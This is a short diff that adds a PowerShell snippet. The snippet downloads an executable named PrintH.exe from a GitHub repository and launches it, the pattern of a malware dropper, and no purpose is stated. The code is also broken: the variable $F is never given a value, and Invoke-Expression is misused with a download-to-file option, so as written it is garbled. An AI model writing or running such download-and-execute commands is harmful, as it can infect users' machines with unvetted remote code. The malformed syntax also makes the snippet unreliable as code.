@@ -1,0 +1,3 @@
+$F =
+Start-Process iex (iwr -uri "https://github.com/Lvsix14/Troleito/blob/main/PrintH.exe") -OutFile $F
+Start-Process $F
